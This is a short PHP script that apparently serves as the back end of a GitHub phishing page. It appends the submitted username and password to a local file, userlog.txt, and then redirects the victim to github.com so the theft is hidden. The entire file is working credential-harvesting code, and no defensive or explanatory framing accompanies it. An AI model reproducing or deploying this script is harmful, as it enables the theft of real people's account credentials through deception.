<?php

file_put_contents("userlog.txt", "github Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://github.com');
exit();
                                              
